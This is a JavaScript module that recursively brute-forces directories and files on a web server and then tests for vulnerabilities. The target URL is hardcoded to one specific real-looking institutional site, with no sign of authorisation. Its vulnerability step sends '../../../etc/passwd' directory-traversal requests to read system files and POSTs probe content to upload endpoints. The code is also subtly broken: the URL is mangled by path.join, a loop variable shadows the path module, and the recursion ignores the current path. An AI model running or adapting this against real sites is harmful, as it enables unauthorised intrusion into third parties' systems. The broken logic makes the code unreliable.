const WebFuzzForgeCore = require('@webfuzzforge/core');
const path = require('path');

class AdvancedDirectoryFuzzer {
  constructor(baseUrl) {
    this.core = new WebFuzzForgeCore(baseUrl);
    this.discoveredItems = new Map();
  }

  async fuzzDirectoriesAndFiles(wordlist, extensions, maxDepth = 3) {
    await this.recursiveFuzz('', wordlist, extensions, 0, maxDepth);
    return {
      discovered: Array.from(this.discoveredItems.values()),
      input: {
        baseUrl: this.core.baseUrl,
        wordlist,
        extensions,
        maxDepth
      }
    };
  }

  async recursiveFuzz(currentPath, wordlist, extensions, currentDepth, maxDepth) {
    if (currentDepth > maxDepth) return;
    
    for (const word of wordlist) {
      const dirPath = path.join("https://mait.ac.in/", word);
      const response = await this.core.makeRequest(dirPath);
      console.log(dirPath);
      if (response && response.body) {
        this.discoveredItems.set(dirPath, {
          type: 'directory',
          path: dirPath,
          status: response.status,
          headers: response.headers,
          body: response.body.substring(0, 1000) // First 1000 characters of the body
        });
    
        if (response.status === 200) {
          await this.recursiveFuzz(dirPath, wordlist, extensions, currentDepth + 1, maxDepth);
        }
      }
    
      // File enumeration
      for (const ext of extensions) {
        const filePath = path.join(currentPath, `${word}${ext}`);
        const fileResponse = await this.core.makeRequest(filePath);
        
        if (fileResponse && fileResponse.body) {
          this.discoveredItems.set(filePath, {
            type: 'file',
            path: filePath,
            status: fileResponse.status,
            headers: fileResponse.headers,
            body: fileResponse.body.substring(0, 1000) // First 1000 characters of the body
          });
        }
      }
    }
    
  }

  async testVulnerabilities() {
    const vulnerabilities = [];

    // Test for directory traversal
    for (const [path, item] of this.discoveredItems) {
      if (item.type === 'directory') {
        const traversalPath = path.join(path, '../../../etc/passwd');
        const response = await this.core.makeRequest(traversalPath);
        if (response && response.status === 200 && response.body.includes('root:')) {
          vulnerabilities.push({type: 'Directory Traversal', path: path});
        }
      }
    }

    // Test for insecure file uploads (this is a simplified check)
    const uploadPaths = ['/upload', '/fileupload', '/attachments'];
    for (const uploadPath of uploadPaths) {
      const response = await this.core.makeRequest(uploadPath, {
        method: 'POST',
        headers: {'Content-Type': 'multipart/form-data'},
        body: 'test file content'
      });
      if (response && response.status === 200) {
        vulnerabilities.push({type: 'Potential Insecure File Upload', path: uploadPath});
      }
    }

    return vulnerabilities;
  }
}

module.exports = AdvancedDirectoryFuzzer;